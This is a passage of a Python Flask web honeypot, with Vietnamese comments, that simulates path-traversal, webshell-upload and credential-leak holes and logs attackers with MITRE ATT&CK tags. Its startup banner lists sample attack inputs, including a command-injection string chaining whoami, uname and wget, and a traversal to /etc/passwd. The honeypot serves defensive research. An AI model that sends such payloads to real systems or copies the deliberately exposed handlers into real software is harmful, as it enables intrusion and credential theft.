            f"\n--- {target} ping statistics ---\n"
            f"2 packets transmitted, 2 received, 0% packet loss\n"
        )
        return Response(res, mimetype="text/plain")


@app.route("/api/view", methods=["GET"])
def vulnerable_lfi():
    """
    LỖ HỔNG LOCAL FILE INCLUSION / PATH TRAVERSAL (T1006 / T1552.001)
    """
    client_ip = request.remote_addr or "127.0.0.1"
    client_port = int(request.environ.get("REMOTE_PORT", 80))
    file_path = request.args.get("file", "system.log")
    now_iso = datetime.now(timezone.utc).isoformat()

    logger._write_event({
        "timestamp": now_iso,
        "source_ip": client_ip,
        "source_port": client_port,
        "protocol": "HTTP_LFI",
        "session_id": f"web-lfi-{client_ip.replace('.', '_')}",
        "username": "attacker",
        "event_status": "Path_Traversal_Exploit",
        "message": f"Khai thác đọc trộm file (LFI/Path Traversal): {file_path}",
        "command": f"GET /api/view?file={file_path}",
        "handler_type": "WEB_LFI",
        "mitre_tactic": "Credential Access",
        "mitre_technique_id": "T1552.001",
        "mitre_technique_name": "Credentials in Files",
        "severity": "High"
    })

    if "passwd" in file_path:
        return Response(simulate_command_execution("cat /etc/passwd"), mimetype="text/plain")
    if ".env" in file_path or "config" in file_path:
        return sensitive_leak()
    
    return Response(f"Contents of {file_path}:\n[2026-11-14 13:14:00] System diagnostics daemon running normally.\n[2026-11-14 13:14:10] Internal SSH bastion listening on port {SSH_PORT}.\n", mimetype="text/plain")


@app.route("/api/upload", methods=["POST"])
def vulnerable_upload():
    """
    LỖ HỔNG WEBSHELL UPLOAD (T1505.003 - Persistence)
    Thu giữ mã độc hacker tải lên và cất vào quarantine/
    """
    client_ip = request.remote_addr or "127.0.0.1"
    now_iso = datetime.now(timezone.utc).isoformat()
    
    file = request.files.get("payload")
    if not file:
        return jsonify({"status": "error", "message": "Không tìm thấy file tải lên"}), 400

    filename = file.filename or "shell.php"
    safe_path = QUARANTINE_DIR / f"quarantined_{int(time.time())}_{filename}"
    file.save(safe_path)

    logger._write_event({
        "timestamp": now_iso,
        "source_ip": client_ip,
        "source_port": int(request.environ.get("REMOTE_PORT", 80)),
        "protocol": "HTTP_UPLOAD",
        "session_id": f"web-upload-{client_ip.replace('.', '_')}",
        "username": "attacker",
        "event_status": "Malicious_File_Uploaded",
        "message": f"Hacker tải webshell/mã độc '{filename}' lên máy chủ!",
        "command": f"POST /api/upload [File: {filename}]",
        "handler_type": "WEB_SHELL_UPLOAD",
        "mitre_tactic": "Persistence",
        "mitre_technique_id": "T1505.003",
        "mitre_technique_name": "Server Software Component: Web Shell",
        "severity": "Critical"
    })

    print(f"\n🚨 [MALWARE UPLOAD] Thu giữ thành công file '{filename}' vào thư mục quarantine/!")
    return jsonify({
        "status": "success",
        "message": f"File '{filename}' đã được tải lên thành công tại /var/www/uploads/{filename}",
        "quarantined_as": safe_path.name
    })


@app.route("/api/feed/latest_csic_http")
def get_latest_csic_http():
    """Trả về 1 bản ghi HTTP request mới nhất chuẩn schema csic_database.csv cho mô hình AI"""
    if CSIC_UNLABELED_JSONL.exists():
        try:
            with open(CSIC_UNLABELED_JSONL, "r", encoding="utf-8") as f:
                lines = [l.strip() for l in f if l.strip()]
                if lines:
                    return jsonify({"status": "success", "csic_record": json.loads(lines[-1])})
        except Exception as e:
            return jsonify({"status": "error", "message": str(e)}), 500
    return jsonify({"status": "empty", "message": "Chưa có HTTP request nào"}), 404


@app.route("/api/feed/csic_http")
def get_csic_http_feed():
    """Trả về danh sách các request HTTP gần đây chuẩn format CSIC 2010"""
    limit = int(request.args.get("limit", 50))
    records = []
    if CSIC_UNLABELED_JSONL.exists():
        try:
            with open(CSIC_UNLABELED_JSONL, "r", encoding="utf-8") as f:
                for line in f:
                    line = line.strip()
                    if line:
                        records.append(json.loads(line))
        except Exception:
            pass
    return jsonify(list(reversed(records))[:limit])


@app.route("/api/export/csic_csv")
def export_csic_csv():
    """Tải về toàn bộ log HTTP dạng file CSV chuẩn hệt file csic_database.csv"""
    if CSIC_CSV_FILE.exists():
        with open(CSIC_CSV_FILE, "r", encoding="utf-8") as f:
            content = f.read()
        return Response(
            content,
            mimetype="text/csv",
            headers={"Content-Disposition": "attachment; filename=csic_http_requests.csv"}
        )
    return "No CSV generated yet", 404


if __name__ == "__main__":
    print("=" * 70)
    print("🌐 [WEB DECOY HONEYPOT] ĐANG KHỞI CHẠY (LỚP 7)...")
    print(f"[*] Lắng nghe tại: http://{WEB_HOST}:{WEB_PORT}")
    print(f"[*] Giao diện Web: Mở trình duyệt truy cập http://localhost:{WEB_PORT}")
    print(f"[*] Các lỗ hổng mồi nhử:")
    print(f"    - RCE: /api/ping?host=127.0.0.1;whoami;uname -a;wget ...")
    print(f"    - Leak .env: /.env, /config.php (Chứa SSH credentials)")
    print(f"    - LFI: /api/view?file=../../../../etc/passwd")
    print(f"    - Upload: /api/upload (Webshell)")
    print("=" * 70)
    app.run(host=WEB_HOST, port=WEB_PORT, debug=False)
